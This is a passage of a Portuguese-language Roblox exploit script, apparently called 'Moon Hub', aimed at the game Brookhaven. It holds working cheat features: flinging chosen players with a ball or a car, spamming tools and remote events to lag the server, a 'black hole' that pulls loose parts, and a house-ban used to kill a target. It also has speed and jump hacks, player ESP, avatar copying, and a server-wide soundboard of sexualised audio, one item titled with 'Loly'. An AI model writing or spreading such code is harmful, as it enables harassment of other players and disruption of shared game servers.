      local character = player.Character or player.CharacterAdded:Wait()
      local humanoid = character:WaitForChild("Humanoid")
      local backpack = player:WaitForChild("Backpack")
      local ServerBalls = W.WorkspaceCom:WaitForChild("001_SoccerBalls")

      local function GetBall()
        if not backpack:FindFirstChild("SoccerBall") and not character:FindFirstChild("SoccerBall") then
          R.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "SoccerBall")
        end
        repeat task.wait() until backpack:FindFirstChild("SoccerBall") or character:FindFirstChild("SoccerBall")
        local bt = backpack:FindFirstChild("SoccerBall")
        if bt then bt.Parent = character end
        repeat task.wait() until ServerBalls:FindFirstChild("Soccer" .. player.Name)
        return ServerBalls:FindFirstChild("Soccer" .. player.Name)
      end

      local Ball = ServerBalls:FindFirstChild("Soccer" .. player.Name) or GetBall()
      Ball.CanCollide = false
      Ball.Massless = true
      Ball.CustomPhysicalProperties = PhysicalProperties.new(0.0001, 0, 0)

      if target ~= player then
        local tchar = target.Character
        if tchar and tchar:FindFirstChild("HumanoidRootPart") and tchar:FindFirstChild("Humanoid") then
          local troot = tchar.HumanoidRootPart
          local thum = tchar.Humanoid
          if Ball:FindFirstChildWhichIsA("BodyVelocity") then
            Ball:FindFirstChildWhichIsA("BodyVelocity"):Destroy()
          end
          local bv = Instance.new("BodyVelocity")
          bv.Velocity = Vector3.new(9e8, 9e8, 9e8)
          bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
          bv.P = 9e900
          bv.Parent = Ball
          cam.CameraSubject = thum
          repeat
            if troot.Velocity.Magnitude > 0 then
              local pos = troot.Position + (troot.Velocity / 1.5)
              Ball.CFrame = CFrame.new(pos)
              Ball.Orientation = Ball.Orientation + Vector3.new(45, 60, 30)
            else
              for _, v in pairs(tchar:GetChildren()) do
                if v:IsA("BasePart") and v.CanCollide and not v.Anchored then
                  Ball.CFrame = v.CFrame
                  task.wait(1/6000)
                end
              end
            end
            task.wait(1/6000)
          until troot.Velocity.Magnitude > 1000 or thum.Health <= 0 or not tchar:IsDescendantOf(W) or target.Parent ~= P
          cam.CameraSubject = humanoid
        end
      end
    end

    UIS.TouchTap:Connect(function(toques, proc)
      if not equipado or proc then return end
      local pos = toques[1]
      local raio = cam:ScreenPointToRay(pos.X, pos.Y)
      local hit = W:Raycast(raio.Origin, raio.Direction * 1000)
      if hit and hit.Instance then
        local modelo = hit.Instance:FindFirstAncestorOfClass("Model")
        local jogador = P:GetPlayerFromCharacter(modelo)
        if jogador and jogador ~= eu then FlingBall(jogador) end
      end
    end)
  end,
})

-- ═══════════════════════════════════════════════════════════════════════
-- LAG SERVER (Bomba, Computador, Celula)
-- ═══════════════════════════════════════════════════════════════════════
tab3:AddSection({ "Laga Server" })

local _gtvzLags = { Laptop = false, Phone = false, Bomb = false }

tab3:AddToggle({
  Name = "LAG COMPUTADOR",
  Description = "Spamma o Laptop do Brookhaven (laga o server)",
  Default = false,
  Callback = function(state)
    _gtvzLags.Laptop = state
    if state then
      local laptop = workspace:FindFirstChild("WorkspaceCom")
        and workspace.WorkspaceCom:FindFirstChild("001_GiveTools")
        and workspace.WorkspaceCom["001_GiveTools"]:FindFirstChild("Laptop")
      if not laptop then warn("[Moon] Laptop não encontrado"); return end
      task.spawn(function()
        while _gtvzLags.Laptop do
          local char = localPlayer.Character
          local hrp = char and char:FindFirstChild("HumanoidRootPart")
          if hrp then
            hrp.CFrame = laptop.CFrame
            local cd = laptop:FindFirstChildWhichIsA("ClickDetector")
            if cd then fireclickdetector(cd) end
          end
          task.wait(0.0001)
        end
      end)
    end
  end,
})

tab3:AddToggle({
  Name = "LAG CELULA",
  Description = "Spamma o Iphone do Brookhaven (laga o server)",
  Default = false,
  Callback = function(state)
    _gtvzLags.Phone = state
    if state then
      local phone = workspace:FindFirstChild("WorkspaceCom")
        and workspace.WorkspaceCom:FindFirstChild("001_CommercialStores")
        and workspace.WorkspaceCom["001_CommercialStores"]:FindFirstChild("CommercialStorage1")
        and workspace.WorkspaceCom["001_CommercialStores"]["CommercialStorage1"]:FindFirstChild("Store")
        and workspace.WorkspaceCom["001_CommercialStores"]["CommercialStorage1"]["Store"]:FindFirstChild("Tools")
        and workspace.WorkspaceCom["001_CommercialStores"]["CommercialStorage1"]["Store"]["Tools"]:FindFirstChild("Iphone")
      if not phone then warn("[Moon] Iphone não encontrado"); return end
      task.spawn(function()
        while _gtvzLags.Phone do
          local char = localPlayer.Character
          local hrp = char and char:FindFirstChild("HumanoidRootPart")
          if hrp then
            hrp.CFrame = phone.CFrame
            local cd = phone:FindFirstChildWhichIsA("ClickDetector")
            if cd then fireclickdetector(cd) end
          end
          task.wait(0.01)
        end
      end)
    end
  end,
})

tab3:AddToggle({
  Name = "LAG BOMBA",
  Description = "Spamma a bomba do Brookhaven (laga o server)",
  Default = false,
  Callback = function(state)
    _gtvzLags.Bomb = state
    if not state then return end

    local P = game:GetService("Players")
    local RS = game:GetService("ReplicatedStorage")
    local WS = game:GetService("Workspace")
    local player = P.LocalPlayer

    task.spawn(function()
      local bomb = WS:FindFirstChild("WorkspaceCom")
        and WS.WorkspaceCom:FindFirstChild("001_CriminalWeapons")
        and WS.WorkspaceCom["001_CriminalWeapons"]:FindFirstChild("GiveTools")
        and WS.WorkspaceCom["001_CriminalWeapons"]["GiveTools"]:FindFirstChild("Bomb")
      if not bomb then warn("[Moon] Bomba não encontrada"); return end

      while _gtvzLags.Bomb do
        local char = player.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if hrp and bomb then
          hrp.CFrame = bomb.CFrame
          if bomb:FindFirstChild("ClickDetector") then
            fireclickdetector(bomb.ClickDetector)
          end
        end
        task.wait(0.00001)
      end
    end)

    task.spawn(function()
      while _gtvzLags.Bomb do
        local VIM = game:GetService("VirtualInputManager")
        VIM:SendMouseButtonEvent(500, 500, 0, true, game, 0)
        task.wait(1.5)
        VIM:SendMouseButtonEvent(500, 500, 0, false, game, 0)
        pcall(function()
          RS:WaitForChild("RE"):WaitForChild("1Blo1wBomb1sServe1r"):FireServer("Bomb" .. player.Name)
        end)
        task.wait(1.5)
      end
    end)
  end,
})

-- ═══════════════════════════════════════════════════════════════════════
-- AUTO SPAW ELI (Black Hole na Praça)
-- ═══════════════════════════════════════════════════════════════════════
tab3:AddSection({ "Menu Praça (Black Hole)" })

local _gtvzBlackHole = { ativo = false, conn = nil, conn2 = nil }

local function _toggleBlackHole()
  _gtvzBlackHole.ativo = not _gtvzBlackHole.ativo

  local WS = game:GetService("Workspace")
  local RS = game:GetService("RunService")

  if _gtvzBlackHole.ativo then
    local folder = WS:FindFirstChild("BringPartsFolder")
    if not folder then
      folder = Instance.new("Folder")
      folder.Name = "BringPartsFolder"
      folder.Parent = WS
    end

    local part = folder:FindFirstChild("AnchorPart")
    if not part then
      part = Instance.new("Part")
      part.Name = "AnchorPart"
      part.Anchored = true
      part.CanCollide = false
      part.Transparency = 1
      part.Size = Vector3.new(5, 5, 5)
      part.Position = Vector3.new(-26.54624575495172, 4.13895320892334, 3.941930037536621)
      part.Parent = folder
    end

    local att1 = part:FindFirstChild("At1") or Instance.new("Attachment")
    att1.Name = "At1"
    att1.Parent = part

    local function forcePart(v)
      if v:IsA("BasePart") and not v.Anchored and not v.Parent:FindFirstChildOfClass("Humanoid")
        and not v.Parent:FindFirstChild("Head") and v.Name ~= "Handle" then
        for _, x in ipairs(v:GetChildren()) do
          if x:IsA("BodyMover") or x:IsA("RocketPropulsion") then x:Destroy() end
        end
        if v:FindFirstChild("Attachment") then v:FindFirstChild("Attachment"):Destroy() end
        if v:FindFirstChild("AlignPosition") then v:FindFirstChild("AlignPosition"):Destroy() end
        if v:FindFirstChild("Torque") then v:FindFirstChild("Torque"):Destroy() end
        v.CanCollide = false
        local t = Instance.new("Torque", v)
        t.Torque = Vector3.new(9e9, 9e9, 9e9)
        local a = Instance.new("AlignPosition", v)
        local at = Instance.new("Attachment", v)
        t.Attachment0 = at
        a.MaxForce = 1e12
        a.MaxVelocity = 1e12
        a.Responsiveness = 1e12
        a.Attachment0 = at
        a.Attachment1 = att1
      end
    end

    local char = localPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if hrp then
      hrp.CFrame = CFrame.new(-308.447265625, 42.98085403442383, 94.30621337890625)
    end

    for _, v in ipairs(WS:GetDescendants()) do forcePart(v) end
    _gtvzBlackHole.conn = WS.DescendantAdded:Connect(function(v)
      if _gtvzBlackHole.ativo then forcePart(v) end
    end)

    local ang = 0
    _gtvzBlackHole.conn2 = RS.RenderStepped:Connect(function()
      if _gtvzBlackHole.ativo then
        ang = ang + math.rad(999999)
        local c = part.Position
        att1.WorldPosition = c + Vector3.new(math.sin(ang)*2, math.cos(ang*2)*1, math.cos(ang)*2)
      end
    end)
  else
    if _gtvzBlackHole.conn then _gtvzBlackHole.conn:Disconnect(); _gtvzBlackHole.conn = nil end
    if _gtvzBlackHole.conn2 then _gtvzBlackHole.conn2:Disconnect(); _gtvzBlackHole.conn2 = nil end

    for _, v in ipairs(WS:GetDescendants()) do
      if v:IsA("BasePart") then
        for _, c in ipairs(v:GetChildren()) do
          if c:IsA("AlignPosition") or c:IsA("Torque") then c:Destroy() end
        end
      end
    end
  end
end

tab3:AddButton({
  Name = "ATIVAR AUTO SPAW ELI (Black Hole)",
  Description = "Puxa tudo pra praça central",
  Callback = function()
    if not _gtvzBlackHole.ativo then _toggleBlackHole() end
  end,
})

tab3:AddButton({
  Name = "DESATIVAR BLACK HOLE",
  Callback = function()
    if _gtvzBlackHole.ativo then _toggleBlackHole() end
  end,
})

-- ═══════════════════════════════════════════════════════════════════════
-- MATA JOGADOR BAN (Usa sistema de casa do Brookhaven)
-- ═══════════════════════════════════════════════════════════════════════
tab3:AddButton({
  Name = "MATA JOGADOR BAN",
  Description = "Usa o alvo selecionado no dropdown acima",
  Callback = function()
    local P = game:GetService("Players")
    local RS = game:GetService("ReplicatedStorage")
    local WS = game:GetService("Workspace")
    local Player = P.LocalPlayer

    local alvoNome = (getgenv and getgenv().Target) or cartolaSelectedPlayer
    if not alvoNome then
      warn("[Moon] Nenhum alvo selecionado no dropdown")
      return
    end

    local targetPlayer = P:FindFirstChild(alvoNome)
    if not targetPlayer or not targetPlayer.Character then
      warn("[Moon] Alvo inválido")
      return
    end

    local char = Player.Character
    local Humanoid = char and char:FindFirstChildOfClass("Humanoid")
    local RootPart = char and char:FindFirstChild("HumanoidRootPart")
    local Houses = WS:FindFirstChild("001_Lots")
    local Vehicles = WS:FindFirstChild("Vehicles")
    if not Humanoid or not RootPart or not Houses or not Vehicles then return end

    local Angles = 0
    local House = Houses:FindFirstChild(Player.Name .. "House")

    if not House then
      local EHouse, buyDetector
      for _, Lot in pairs(Houses:GetChildren()) do
        if Lot.Name == "For Sale" then
          for _, num in pairs(Lot:GetDescendants()) do
            if num:IsA("NumberValue") and num.Name == "Number" and num.Value < 25 and num.Value > 10 then
              EHouse = Lot
              break
            end
          end
        end
      end

      if EHouse then
        buyDetector = EHouse:FindFirstChild("BuyHouse")
        if buyDetector and buyDetector:IsA("BasePart") then
          RootPart.CFrame = buyDetector.CFrame + Vector3.new(0, -6, 0)
          task.wait(0.5)
          local cd = buyDetector:FindFirstChild("ClickDetector")
          if cd then fireclickdetector(cd) end
        end
      end
    end

    task.wait(0.5)
    local PreHouse = Houses:FindFirstChild(Player.Name .. "House")
    if PreHouse then
      local Number
      for _, x in pairs(PreHouse:GetDescendants()) do
        if x.Name == "Number" and x:IsA("NumberValue") then Number = x end
      end
      if Number then
        RS.RE:FindFirstChild("1Gettin1gHous1e"):FireServer("PickingCustomHouse", "049_House", Number.Value)
      end
    end

    task.wait(0.5)
    local PCar = Vehicles:FindFirstChild(Player.Name .. "Car")
    if not PCar then
      RootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
      task.wait(0.5)
      RS.RE:FindFirstChild("1Ca1r"):FireServer("PickingCar", "SchoolBus")
      task.wait(1)
      PCar = Vehicles:FindFirstChild(Player.Name .. "Car")
    end

    if not PCar then return end

    local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
    if Seat and not Humanoid.Sit then
      repeat
        task.wait()
        RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
      until Humanoid.Sit
    end

    local Target = targetPlayer
    local TargetC = Target.Character
    local TargetH = TargetC and TargetC:FindFirstChildOfClass("Humanoid")
    local TargetRP = TargetC and TargetC:FindFirstChild("HumanoidRootPart")

    if not (TargetC and TargetH and TargetRP) then return end

    while not TargetH.Sit do
      task.wait()
      local Fling = function(alvo, pos, ang)
        PCar:SetPrimaryPartCFrame(CFrame.new(alvo.Position) * pos * ang)
      end
      Angles = Angles + 100
      Fling(TargetRP, CFrame.new(0, 1.5, 0), CFrame.Angles(math.rad(Angles), 0, 0))
      Fling(TargetRP, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(Angles), 0, 0))
      Fling(TargetRP, CFrame.new(2.25, 1.5, -2.25), CFrame.Angles(math.rad(Angles), 0, 0))
      Fling(TargetRP, CFrame.new(-2.25, -1.5, 2.25), CFrame.Angles(math.rad(Angles), 0, 0))
    end

    task.wait(0.2)
    local House2 = Houses:FindFirstChild(Player.Name .. "House")
    if House2 and House2:FindFirstChild("HouseSpawnPosition") then
      PCar:SetPrimaryPartCFrame(CFrame.new(House2.HouseSpawnPosition.Position))
    end

    task.wait(0.2)
    local reg = Region3.new(RootPart.Position - Vector3.new(30, 30, 30), RootPart.Position + Vector3.new(30, 30, 30))
    local parts = WS:FindPartsInRegion3(reg, RootPart, math.huge)
    for _, v in pairs(parts) do
      if v.Name == "HumanoidRootPart" then
        local b = P:FindFirstChild(v.Parent.Name)
        if b then
          RS.RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer("BanPlayerFromHouse", b, v.Parent)
        end
      end
    end
    RS.RE:FindFirstChild("1Ca1r"):FireServer("DeleteAllVehicles")
  end,
})

-- ═══════════════════════════════════════════════════════════════════════

  tab4:AddSlider({
    Name = "Velocidade (Speed)",
    Min = 16,
    Max = 1000,
    Default = 16,
    Color = Color3.fromRGB(255, 255, 255),
    Flag = "SpeedSlider",
    Callback = function(value56)
      local localPlayer6 = players.LocalPlayer

      if localPlayer6.Character and localPlayer6.Character:FindFirstChild("Humanoid") then
        localPlayer6.Character.Humanoid.WalkSpeed = value56
      end
    end,
  })

  tab4:AddSlider({
    Name = "Pulo (JumpPower)",
    Min = 50,
    Max = 500,
    Default = 50,
    Color = Color3.fromRGB(255, 255, 255),
    Flag = "JumpSlider",
    Callback = function(value57)
      local localPlayer7 = players.LocalPlayer

      if localPlayer7.Character and localPlayer7.Character:FindFirstChild("Humanoid") then
        localPlayer7.Character.Humanoid.UseJumpPower = true
        localPlayer7.Character.Humanoid.JumpPower = value57
      end
    end,
  })

  _G.InfJump = false

  tab4:AddToggle({
    Name = "Infinite Jump",
    Default = false,
    Callback = function(value58)
      _G.InfJump = value58

      userInputService.JumpRequest:Connect(function()
        if _G.InfJump then
          local localPlayer8 = players.LocalPlayer

          if localPlayer8.Character and localPlayer8.Character:FindFirstChildOfClass("Humanoid") then
            localPlayer8.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
          end
        end
      end)
    end,
  })

  tab4:AddSlider({
    Name = "Gravidade",
    Min = 0,
    Max = 196.2,
    Default = 196.2,
    Color = Color3.fromRGB(255, 255, 255),
    Flag = "GravitySlider",
    Callback = function(value59) workspaceService.Gravity = value59 end,
  })

  tab4:AddSection({ "Visuais / ESP" })

  _G.EspRgb = false
  connect4 = nil

  tab4:AddToggle({
    Name = "ESP Jogadores (RGB)",
    Default = false,
    Callback = function(value60)
      _G.EspRgb = value60
      local localPlayer9 = players.LocalPlayer

      if _G.EspRgb then
        connect4 = runService.RenderStepped:Connect(function()
          local v133 = tick()
          local color = Color3.fromHSV(v133 % 5 / 5, 1, 1)

          for index48, value61 in ipairs(players:GetPlayers()) do
            if value61 ~= localPlayer9 and value61.Character then
              local espHighlight = value61.Character:FindFirstChild("EspHighlight")

              if not espHighlight then
                espHighlight = Instance.new("Highlight")
                espHighlight.Name = "EspHighlight"
                espHighlight.Adornee = value61.Character
                espHighlight.Parent = value61.Character
              end

              espHighlight.FillColor = color
              espHighlight.OutlineColor = Color3.new(1, 1, 1)
            end
          end
        end)
      else
        if connect4 then
          connect4:Disconnect()
          connect4 = nil
        end

        for index49, value62 in ipairs(players:GetPlayers()) do
          if value62.Character then
            local espHighlight2 = value62.Character:FindFirstChild("EspHighlight")

            if espHighlight2 then
              espHighlight2:Destroy()
            end
          end
        end
      end
    end,
  })

  tab5:AddSection({ "avatares" })
  localPlayer3 = players.LocalPlayer
  local remotes = replicatedStorage:WaitForChild("Remotes", 10)
if not remotes then
    warn("[Moon Hub] Remotes não encontrado")
    return
end

  function f16()
    local v134 = {}

    for index50, value63 in ipairs(players:GetPlayers()) do
      if value63.Name ~= localPlayer3.Name then
        table.insert(v134, value63.Name)
      end
    end

    return v134
  end

  v12 = nil

  playersListAddDropdown = tab5:AddDropdown({
    Name = "Players List",
    Description = "",
    Options = f16(),
    Default = "",
    Flag = "player list",
    Callback = function(value64) v12 = value64 end,
  })

  function f23()
    playersListAddDropdown:Set(f16())
  end

  f23()

  tab5:AddButton({ "Atualizar lista", function() f23() end })

  players.PlayerAdded:Connect(f23)
  players.PlayerRemoving:Connect(f23)

  tab5:AddButton({
    Name = "Copy Avatar",
    Callback = function()
      if not v12 then
        return
      else
        local character14 = players.LocalPlayer.Character
        local findFirstChild14 = players:FindFirstChild(v12)

        if findFirstChild14 and findFirstChild14.Character then
          local humanoid23 = character14 and character14:FindFirstChildOfClass("Humanoid")
          local humanoid24 = findFirstChild14.Character:FindFirstChildOfClass("Humanoid")

          if humanoid23 and humanoid24 then
            local getAppliedDescription = humanoid23:GetAppliedDescription()

            for index51, value65 in ipairs(getAppliedDescription:GetAccessories(true)) do
              if value65.AssetId and tonumber(value65.AssetId) then
                remotes.Wear:InvokeServer(tonumber(value65.AssetId))
                task.wait(0.2)
              end
            end

            if tonumber(getAppliedDescription.Shirt) then
              remotes.Wear:InvokeServer(tonumber(getAppliedDescription.Shirt))
              task.wait(0.2)
            end

            if tonumber(getAppliedDescription.Pants) then
              remotes.Wear:InvokeServer(tonumber(getAppliedDescription.Pants))
              task.wait(0.2)
            end

            if tonumber(getAppliedDescription.Face) then
              remotes.Wear:InvokeServer(tonumber(getAppliedDescription.Face))
              task.wait(0.2)
            end

            local getAppliedDescription2 = humanoid24:GetAppliedDescription()

            remotes.ChangeCharacterBody:InvokeServer(unpack({
              {
                getAppliedDescription2.Torso, getAppliedDescription2.RightArm,
                getAppliedDescription2.LeftArm, getAppliedDescription2.RightLeg,
                getAppliedDescription2.LeftLeg, getAppliedDescription2.Head,
              },
            }))

            task.wait(0.5)

            if tonumber(getAppliedDescription2.Shirt) then
              remotes.Wear:InvokeServer(tonumber(getAppliedDescription2.Shirt))
              task.wait(0.3)
            end

            if tonumber(getAppliedDescription2.Pants) then
              remotes.Wear:InvokeServer(tonumber(getAppliedDescription2.Pants))
              task.wait(0.3)
            end

            if tonumber(getAppliedDescription2.Face) then
              remotes.Wear:InvokeServer(tonumber(getAppliedDescription2.Face))
              task.wait(0.3)
            end

            for index52, value66 in ipairs(getAppliedDescription2:GetAccessories(true)) do
              if value66.AssetId and tonumber(value66.AssetId) then
                remotes.Wear:InvokeServer(tonumber(value66.AssetId))
                task.wait(0.3)
              end
            end

            local bodyColors = findFirstChild14.Character:FindFirstChild("Body Colors")

            if bodyColors then
              remotes.ChangeBodyColor:FireServer(tostring(bodyColors.HeadColor))
              task.wait(0.3)
            end

            if tonumber(getAppliedDescription2.IdleAnimation) then
              remotes.Wear:InvokeServer(tonumber(getAppliedDescription2.IdleAnimation))
              task.wait(0.3)
            end
          end
        end
      end
    end,
  })

  tab5:AddSection({ "Roupas 3D" })

  v13 = {}
  v13.ReplicatedStorage = replicatedStorage

  function v13:MostrarNotificacao(text)
    pcall(function()
      starterGui:SetCore("SendNotification", { Title = "Aviso", Text = text, Duration = 5 })
    end)
  end

  v13.Avatares = {
    { Nome = "Gato de Manga", ID = 124948425515120 },
    { Nome = "Tung Saur", ID = 117098257036480 }, { Nome = "Tralaleiro", ID = 99459753608381 },
    { Nome = "Monstro S.A", ID = 123609977175230 }, { Nome = "Trenzinho", ID = 80468697076178 },
    { Nome = "Dino", ID = 11941741105 }, { Nome = "Pou idoso", ID = 15742966010 },
    { Nome = "Coco/boxt@", ID = 77013984520332 }, { Nome = "Coelho", ID = 71797333686800 },
    { Nome = "HipopÃ³tamo", ID = 73215892129281 }, { Nome = "Ratatui", ID = 108557570415450 },
    { Nome = "Galinha", ID = 71251793812515 }, { Nome = "Pepa pig", ID = 92979204778377 },
    { Nome = "pinguin", ID = 94944293759578 }, { Nome = "Sid", ID = 87442757321244 },
    { Nome = "puga grande", ID = 111436158728716 },
    { Nome = "SHREK AMALDIÃ‡OADO", ID = 120960401202170 },
    { Nome = "mosquito grande", ID = 108052868536440 },
    { Nome = "Noob Invertido", ID = 106596990206151 },
    { Nome = "Pato(a)", ID = 135132836238350 },
    { Nome = "Cachorro Chihuahua", ID = 18656467256 }, { Nome = "Gato sla", ID = 18994959003 },
    { Nome = "Gato fei ", ID = 77506186615650 }, { Nome = "Inpostor", ID = 18234669337 },
    { Nome = "Simon amarelo", ID = 75183593514657 },
    { Nome = "Simon azul", ID = 76155710249925 },
  }

  function v13:GetAvatarNames()
    local v135 = {}

    for index53, value67 in ipairs(self.Avatares) do
      table.insert(v135, value67.Nome)
    end

    return v135
  end

  function v13:EquiparAvatar(p19)
    local v136

    for index54, value68 in ipairs(self.Avatares) do
      if value68.Nome == p19 then
        v136 = { value68.ID }

        if pcall(function()
          return self.ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Wear"):InvokeServer(unpack(v136))
        end) then
          self:MostrarNotificacao("Avatar " .. p19 .. " equipado com sucesso!")
        else
          self:MostrarNotificacao("Falha ao equipar o avatar " .. p19 .. "!")
        end
        return
      end
    end
  end

  tab5:AddDropdown({
    Name = "assesorios 3D",
    Description = "Selecione para equipar",
    Default = nil,
    Options = v13:GetAvatarNames(),
    Callback = function(value69) _G.SelectedAvatar = value69 end,
  })

  tab5:AddButton({
    Name = "equipar",
    Description = "Equipar selecionado",
    Callback = function()
      if not _G.SelectedAvatar or _G.SelectedAvatar == "" then
        v13:MostrarNotificacao("Nenhum avatar selecionado!")
        return
      end

      v13:EquiparAvatar(_G.SelectedAvatar)
    end,
  })

  tab5:AddSection({ "Avatar Editor" })
  tab5:AddParagraph({ Title = "aviso vai resetar seu avatar", Content = "" })

  tab5:AddButton({
    Name = "Mini REPO",
    Callback = function()
      replicatedStorage:WaitForChild("Remotes"):WaitForChild("ChangeCharacterBody"):InvokeServer({
        117101023704820, 125767940563840, 137301494386930, 87357384184710, 133391239416999,
        111818794467820,
      })
    end,
  })

  tab5:AddButton({
    Name = "mini garanhao",
    Callback = function()
      replicatedStorage:WaitForChild("Remotes"):WaitForChild("ChangeCharacterBody"):InvokeServer({
        124355047456540, 120507500641960, 82273782655463, 113625313757230, 109182039511426, 0,
      })
    end,
  })

  tab5:AddButton({
    Name = "stick",
    Callback = function()
      replicatedStorage:WaitForChild("Remotes"):WaitForChild("ChangeCharacterBody"):InvokeServer({
        14731384498, 14731377938, 14731377894, 14731377875, 14731377941, 14731382899,
      })
    end,
  })

  tab5:AddButton({
    Name = "Chunky-Bug",
    Callback = function()
      replicatedStorage:WaitForChild("Remotes"):WaitForChild("ChangeCharacterBody"):InvokeServer({
        15527827600, 15527827578, 15527831669, 15527836067, 15527827184, 15527827599,
      })
    end,
  })

  tab5:AddButton({
    Name = "Cursed-Spider",
    Callback = function()
      replicatedStorage:WaitForChild("Remotes"):WaitForChild("ChangeCharacterBody"):InvokeServer({
        134555168634910, 100269043793774, 125607053187320, 122504853343600, 95907982259204,
        91289185840375,
      })
    end,
  })

  tab5:AddButton({
    Name = "Possessed-Horror",
    Callback = function()
      replicatedStorage:WaitForChild("Remotes"):WaitForChild("ChangeCharacterBody"):InvokeServer({
        122800511983370, 132465361516275, 125155800236527, 83070163355072, 102906187256945,
        78311422507297,
      })
    end,
  })

  localPlayer4 = players.LocalPlayer
  replicatedStorage:WaitForChild("Remotes")
  tab6:AddSection({ "RGBs" })

  _G.RGBSkin = false
  _G.RGBHair = false

  tab6:AddToggle({
    Name = "RGB Skin",
    Default = false,
    Callback = function(value70)
      _G.RGBSkin = value70

      task.spawn(function()
        while _G.RGBSkin do
          local v137 = tick()
          Color3.fromHSV(v137 % 5 / 5, 1, 1)
          task.wait(0.1)
        end
      end)
    end,
  })

  tab6:AddToggle({
    Name = "Cabelo RGB",
    Default = false,
    Callback = function(value71)
      _G.RGBHair = value71

      task.spawn(function()
        while _G.RGBHair do
          local v138 = tick()
          local color2 = Color3.fromHSV(v138 % 5 / 5, 1, 1)

          pcall(function()
            local character15 = localPlayer4.Character

            if character15 then
              for index55, value72 in ipairs(character15:GetChildren()) do
                if value72:IsA("Accessory") then
                  local handle = value72:FindFirstChild("Handle")

                  if handle then
                    for index56, value73 in ipairs(handle:GetChildren()) do
                      if value73:IsA("SpecialMesh") or value73:IsA("MeshPart") then
                        value73.VertexColor = Vector3.new(color2.R, color2.G, color2.B)
                      end
                    end
                  end
                end
              end
            end
          end)
          task.wait(0.1)
        end
      end)
    end,
  })

  tab6:AddSection({ "InformaÃ§Ãµes" })

  tab6:AddParagraph({
    Title = "vai ter mais coisas na atualizaÃ§Ã£o",
    Content = "Vai ter mais coisas na prÃ³xima atualizaÃ§Ã£o!",
  })

  v14 = false
  v15 = ""

  tab:AddTextBox({
    Name = "Insira o ID Audio All",
    Description = "Digite o ID do som que deseja tocar",
    Default = "",
    PlaceholderText = "Exemplo: 6832470734",
    ClearTextOnFocus = true,
    Callback = function(value74) v15 = tonumber(value74) end,
  })

  function f24(p20, p21)
    local findFirstChild15 = replicatedStorage:FindFirstChild("RE")
      and replicatedStorage.RE:FindFirstChild(p20)

    if findFirstChild15 then
      pcall(function() findFirstChild15:FireServer(unpack(p21)) end)
    end
  end

  tab:AddButton({
    Name = "Tocar Som",
    Description = "Clique para tocar a mÃºsica inserida",
    Callback = function()
      if v15 then
        f24("1Gu1nSound1s", { workspaceService, v15, 1 })

        local instance = Instance.new("Sound", workspaceService)
        instance.SoundId = "rbxassetid://" .. v15
        instance.Looped = false
        instance:Play()

        task.wait(3)
        instance:Destroy()
      end
    end,
  })

  tab:AddToggle({
    Name = "Loop",
    Description = "Ative para colocar o som em loop",
    Default = false,
    Callback = function(value75)
      v14 = value75

      if v14 then
        task.spawn(function()
          while v14 do
            if v15 then
              f24("1Gu1nSound1s", { workspaceService, v15, 1 })

              local instance2 = Instance.new("Sound", workspaceService)
              instance2.SoundId = "rbxassetid://" .. v15
              instance2.Looped = false
              instance2:Play()

              task.spawn(function()
                task.wait(3)
                instance2:Destroy()
              end)
            end
            task.wait(1)
          end
        end)
      end
    end,
  })

  local function makeSound(name3, p22, default)
    local v139 = {}
    local v140 = {}

    for key, value76 in pairs(p22) do
      for index57, value77 in ipairs(value76) do
        if value77.name ~= "" and value77.id ~= "4354908569" then
          table.insert(v139, value77.name)
          v140[value77.name] = { id = value77.id, category = key }
        end
      end
    end

    local function makeSound2(id, p23, pitch)
      f24("1Gu1nSound1s", { workspaceService, id, p23 })

      local sound = Instance.new("Sound")
      sound.Parent = workspaceService
      sound.SoundId = "rbxassetid://" .. id
      sound.Volume = p23
      sound.Pitch = pitch
      sound.Looped = false
      sound:Play()

      task.spawn(function()
        task.wait(3)
        sound:Destroy()
      end)
    end

    local id2

    tab:AddDropdown({
      Name = name3,
      Description = "Escolha um som para tocar no servidor",
      Default = default,
      Multi = false,
      Options = v139,
      Callback = function(value78)
        if value78 and v140[value78] then
          id2 = v140[value78].id
        else
          id2 = nil
        end
      end,
    })

    tab:AddButton({
      Name = "Tocar Som Selecionado",
      Description = "Clique para tocar o som do dropdown",
      Callback = function()
        if id2 then
          makeSound2(id2, 1, 1)
        end
      end,
    })

    local loop = false

    tab:AddToggle({
      Name = "Loop",
      Description = "Ativa o loop do som selecionado",
      Default = false,
      Callback = function(value79)
        loop = value79

        if value79 then
          task.spawn(function()
            while loop do
              if id2 then
                makeSound2(id2, 1, 1)
              end
              task.wait(1)
            end
          end)
        end
      end,
    })
  end

  makeSound("Selecione um meme", {
    Memes = {
      { name = "pankapakan", id = "122547522269143" },
      { name = "Gemido ultra rÃ¡pido", id = "128863565301778" },
      { name = "vai g0z@?", id = "116293771329297" },
      { name = "G0z33iiii", id = "93462644278510" },
      { name = "Hommmm ", id = "133135656929513" },
      { name = "gemido1", id = "105263704862377" },
      { name = " gemido2", id = "92186909873950" },
      { name = "sus sex", id = "128137573022197" },
      { name = "gemido estranho", id = "131219411501419" },
      { name = "gemido kawai", id = "100409245129170" },
      { name = "Hentai wiaaaaan", id = "88332347208779" },
      { name = "iamete cunasai", id = "108494476595033" },
      { name = "dodichan onnn...", id = "134640594695384" },
      { name = "Loly gemiD0", id = "119277017538197" },
      { name = "ai poison", id = "115870718113313" },
      { name = "chegachega SUS", id = "77405864184828" },
      { name = "uwu", id = "76820720070248" },
      { name = "ai meu cuzin", id = "130714479795369" },
      { name = "girl audio 2", id = "84207358477461" },
      { name = "Hoo ze da manga", id = "106624090319571" },
      { name = "ai alexandre de moraes", id = "107261471941570" },
      { name = "haaii meme", id = "120006672159037" },
      { name = "GoGogo gogogo", id = "103262503950995" },
      { name = "Toma jack", id = "132603645477541" },
      { name = "Toma jackV2", id = "100446887985203" },
      { name = "Toma jack no sol quente", id = "97476487963273" },
